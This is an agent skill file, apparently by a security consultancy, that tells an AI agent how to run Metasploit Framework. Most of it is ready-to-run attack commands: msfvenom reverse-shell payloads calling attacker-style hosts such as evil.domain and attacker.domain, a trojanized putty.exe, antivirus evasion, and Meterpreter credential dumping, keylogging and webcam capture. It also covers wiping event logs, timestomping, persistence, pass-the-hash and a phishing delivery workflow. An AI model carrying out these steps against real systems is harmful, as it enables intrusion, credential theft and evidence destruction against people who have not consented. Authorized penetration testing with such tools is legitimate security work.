---
name: metasploit-framework
description: >
  Operate Metasploit Framework for penetration testing engagements. Use when the user
  needs to run exploits, generate payloads with msfvenom, manage Meterpreter sessions,
  perform post-exploitation (hashdump, getsystem, pivoting, portfwd), set up multi/handler
  listeners, enumerate with db_nmap, write custom modules, or bypass AV/EDR. Covers
  msfconsole, workspace management, exploit/payload selection, meterpreter commands, evasion,
  auxiliary modules, and integration with Cobalt Strike concepts.
  Source: https://github.com/rapid7/metasploit-framework
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/rapid7/metasploit-framework
  stars: '37829'
---

# metasploit-framework Agent Skill

## When to Use This Skill

Use this skill when:
- Running exploits against identified vulnerabilities in an authorized engagement
- Generating shellcode or staged/stageless payloads with msfvenom
- Managing Meterpreter sessions for post-exploitation
- Setting up reverse shell handlers (multi/handler)
- Pivoting through compromised hosts to reach internal segments
- Writing custom Metasploit modules in Ruby
- The user asks about MSF, msfconsole, msfvenom, or Meterpreter

## What Metasploit Framework Is

Metasploit Framework is the world's most widely used open-source penetration testing
platform, maintained by Rapid7. It provides a unified interface to 2,300+ exploits,
1,000+ auxiliary modules, and 400+ post-exploitation modules. The core is a Ruby
framework with the `msfconsole` interactive shell as the primary interface. Metasploit
integrates natively with PostgreSQL for target tracking, nmap for discovery, and supports
extensible payload generation via msfvenom.

## Installation

```bash
# Kali Linux / Parrot (pre-installed, update)
sudo apt update && sudo apt install -y metasploit-framework
msfdb init     # initialize PostgreSQL database

# Ubuntu/Debian (official installer)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall && sudo ./msfinstall
msfdb init

# Docker
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework ./msfconsole
```

## msfconsole Core Usage

```
msfconsole            # launch interactive console
msfconsole -q         # quiet mode (no banner)
msfconsole -r rc.msf  # run resource script on startup

# Help and search
help                           # command overview
search type:exploit platform:windows smb  # filter by type/platform/keyword
search cve:2017-0144           # search by CVE (EternalBlue)
info exploit/windows/smb/ms17_010_eternalblue  # full module info

# Module lifecycle
use exploit/windows/smb/ms17_010_eternalblue
show options          # required and optional settings
show payloads         # compatible payloads for this exploit
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                 # check if target is vulnerable (if supported)
run                   # run exploit (alias: exploit)
run -j                # run as background job
jobs                  # list background jobs
kill 0                # kill job 0
```

## Workspace Management

```
# Workspaces isolate targets per engagement
workspace                  # list workspaces
workspace -a client_acme   # create new workspace
workspace client_acme      # switch to workspace
workspace -d old_project   # delete workspace

# Database commands
db_status                  # confirm PostgreSQL connection
hosts                      # list discovered hosts
hosts -c address,os_name   # filter columns
services                   # list open services
vulns                      # list identified vulnerabilities
creds                      # list captured credentials
notes                      # list stored notes
db_export -f xml /tmp/acme_engagement.xml  # export findings
```

## db_nmap Integration

```
# Scan and automatically import results into MSF database
db_nmap -sV -sC -O --open 10.10.10.0/24
db_nmap -sS -p 1-65535 -T4 10.10.10.40

# Query results
hosts -u              # show unanalyzed hosts
services -p 445       # hosts with port 445 open
services -s http      # hosts with http service name

# Set RHOSTS from database
hosts -R              # set RHOSTS to all discovered hosts
services -p 445 -R    # set RHOSTS to hosts with port 445
```

## Exploit & Payload Selection

```
# Payload types:
# singles      — self-contained (no stager), e.g. windows/shell_reverse_tcp
# stagers      — small first-stage that pulls down second stage
# stages       — second stage (meterpreter, VNC, etc.)
# Naming: <arch>/<payload>/<transport> or <arch>/<stage>/<stager>

# Common payloads
windows/x64/meterpreter/reverse_tcp       # staged, x64 Meterpreter reverse TCP
windows/x64/meterpreter_reverse_https     # stageless HTTPS Meterpreter
windows/x64/shell/reverse_tcp             # staged raw shell
linux/x64/meterpreter/reverse_tcp         # Linux x64 Meterpreter
linux/x86/shell_reverse_tcp               # Linux x86 stageless shell
osx/x64/meterpreter_reverse_tcp           # macOS Meterpreter
java/meterpreter/reverse_tcp              # Java platform
python/meterpreter/reverse_tcp            # Python payload

# Set payload globally
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Encoder/NOP selection (for AV evasion)
show encoders
set ENCODER x86/shikata_ga_nai
set NOP x86/single_byte
```

## msfvenom Payload Generation

```bash
# List formats / encoders / platforms
msfvenom --list formats
msfvenom --list encoders
msfvenom --list platforms

# Windows EXE reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f exe -o shell.exe

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f dll -o evil.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f elf -o shell.elf && chmod +x shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o shell.php

msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f raw -o shell.jsp

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f aspx -o shell.aspx

# PowerShell payload (encode for command-line delivery)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f psh-cmd -o shell_cmd.txt

# Encoded to evade basic AV
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded_shell.exe

# Inject into existing PE (template)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -x putty.exe -k \
  -f exe -o trojanized_putty.exe
```

## Setting Up a Handler

```
# In msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false    # keep handler open for multiple sessions
run -j                     # run as background job

# Stageless HTTPS handler (more evasive)
set PAYLOAD windows/x64/meterpreter_reverse_https
set LPORT 443
set HandlerSSLCert /path/to/cert.pem  # custom SSL cert
run -j
```

## Meterpreter Commands

```
# System information
sysinfo             # OS, hostname, arch
getuid              # current user context
getpid              # Meterpreter process PID
ps                  # process list

# Privilege escalation
getsystem           # attempt automatic privesc (token impersonation, etc.)
# if getsystem fails, use post modules:
run post/multi/recon/local_exploit_suggester

# Process migration (stability / AV evasion)
migrate <PID>       # migrate to another process
migrate -N explorer.exe  # migrate by name (Meterpreter 6.3+)

# File system
pwd; ls; cd C:\\Users\\Administrator\\Desktop
upload /path/local/tool.exe C:\\Windows\\Temp\\tool.exe
download C:\\Users\\Administrator\\NTDS.dit /tmp/
search -f *.kdbx -d C:\\Users  # search for KeePass databases

# Shell and execution
shell                        # drop to cmd.exe / bash
execute -f cmd.exe -i -H    # hidden interactive shell
execute -f powershell.exe -i -H -a "-EncodedCommand <base64>"

# Credential harvesting
hashdump                     # local SAM hashes (requires SYSTEM)
run post/windows/gather/smart_hashdump   # handles DC NTDS.dit
run post/multi/gather/credentials        # generic cred gather

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Screenshots / webcam
screenshot
webcam_snap

# Network
ipconfig; arp; netstat
run post/multi/gather/ping_sweep RHOSTS=10.10.11.0/24
portfwd add -l 3389 -p 3389 -r 10.10.11.5  # local→remote port forward
portfwd add -R -l 8080 -p 80 -r 127.0.0.1  # reverse port forward

# Pivoting
run post/multi/manage/autoroute SUBNET=10.10.11.0/24  # route through session
route add 10.10.11.0/24 <session_id>         # manual route add
use auxiliary/server/socks_proxy
set SRVPORT 1080; set VERSION 5; run -j      # SOCKS5 proxy for proxychains

# Clean up
clearev              # clear Windows event logs
timestomp C:\\evil.exe -b  # wipe timestamps
```

## Post-Exploitation Modules

```
# System enumeration
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_applications
run post/multi/gather/env

# Credential modules
run post/windows/gather/credentials/credential_collector
run post/windows/gather/lsa_secrets
run post/windows/gather/cachedump        # cached domain creds

# Lateral movement
run post/windows/manage/psexec_command COMMAND="whoami" RHOSTS=10.10.11.5
use exploit/windows/smb/psexec
use exploit/windows/local/current_user_psexec

# Persistence
run post/windows/manage/persistence_exe STARTUP=SCHEDULER
use exploit/windows/local/registry_persistence

# Pivoting with Metasploit
# After routing through session, use modules against internal hosts:
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.11.0/24
run
```

## Evasion Techniques

```
# Staged vs stageless: stageless (.exe with full Meterpreter) avoids
# network-based detection of stager downloading second stage

# HTTPS Meterpreter: encrypts C2 traffic; use custom SSL cert
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=evil.domain LPORT=443 \
  -f exe -o shell.exe

# Execution via DLL sideloading (not msfvenom alone — combine with DLL hollowing)

# msfvenom with encoder + iterations (reduces signature matches)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x64/xor_dynamic -i 10 -f csharp

# Inject shellcode into legitimate process via powershell (template)
# 1. Generate raw shellcode:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f csharp > sc.cs
# 2. Embed in PowerShell runner or C# loader; compile and deliver
# 3. Use -k flag with template to keep original process functional

# Evasion modules
use evasion/windows/windows_defender_exe    # AV-evading executable wrapper
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Writing Custom Modules

```ruby
# Skeleton: lib/msf/core/exploit/... or simply place in ~/.msf4/modules/exploits/

##
# A minimal exploit module skeleton
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'My Custom Buffer Overflow',
      'Description' => 'BoF in VulnApp 1.0',
      'Author'      => ['you'],
      'License'     => MSF_LICENSE,
      'References'  => [['CVE', '2024-12345']],
      'Platform'    => 'win',
      'Arch'        => ARCH_X86_64,
      'Targets'     => [['VulnApp 1.0 Windows x64', {}]],
      'DefaultTarget' => 0,
      'DisclosureDate' => '2024-01-01'
    ))
    register_options([
      Opt::RPORT(9999)
    ])
  end

  def exploit
    connect
    buf  = make_nops(100)
    buf += payload.encoded
    buf += "\xCC" * (2000 - buf.length)
    sock.put(buf)
    handler
    disconnect
  end
end

# Reload module in msfconsole
reload_all
use exploit/custom/my_custom_bof
```

## Common Engagement Workflows

### Internal Network Pentest

```
1. db_nmap -sV -sC --open 10.10.10.0/24      # discover targets
2. hosts; services                              # review results
3. search ms17_010 → use eternalblue           # exploit SMB
4. set RHOSTS ...; set PAYLOAD ...; run
5. sessions -l                                  # list sessions
6. sessions -i 1                               # interact with session 1
7. getsystem; getuid                           # confirm SYSTEM
8. hashdump                                    # grab hashes
9. run autoroute SUBNET=10.10.11.0/24          # pivot route
10. use auxiliary/server/socks_proxy; run -j   # SOCKS proxy
11. proxychains nmap -sT -Pn 10.10.11.5        # pivot through socks
```

### Phishing / Initial Access

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.domain LPORT=443 \
  -f exe -o update.exe

# Set up handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0; set LPORT 443
run -j

# Deliver update.exe via phishing email or USB drop
```

### Active Directory Attack Chain

```
sessions -i 1
run post/windows/gather/enum_domain           # find DC
run post/windows/gather/credentials/credential_collector
# Pass the hash with collected NTLM hash:
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass <NTLM_HASH>     # LM:NTLM format
set RHOSTS 10.10.10.5
run
```

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---|---|---|
| `db_status` shows not connected | PostgreSQL not running | `msfdb start` or `sudo service postgresql start` |
| Payload not received | Firewall blocking LPORT | Switch to port 443/80; use HTTPS payload |
| `getsystem` fails | Not admin, or token defenses | Use local exploit suggester; try `bypassuac` modules |
| Meterpreter dies on migration | Wrong PID, 32→64-bit mismatch | Migrate to same-arch process |
| Sessions open then die | AV kills payload | Use stageless HTTPS, custom template, or loader |
| `run -j` creates job but no session | LHOST wrong (docker/VPN) | Set LHOST to interface IP reachable by target |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Securing Active Directory Certificate Services: The Attack Surface Nobody Audits](https://redhound.us/adcs-attack-surface)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
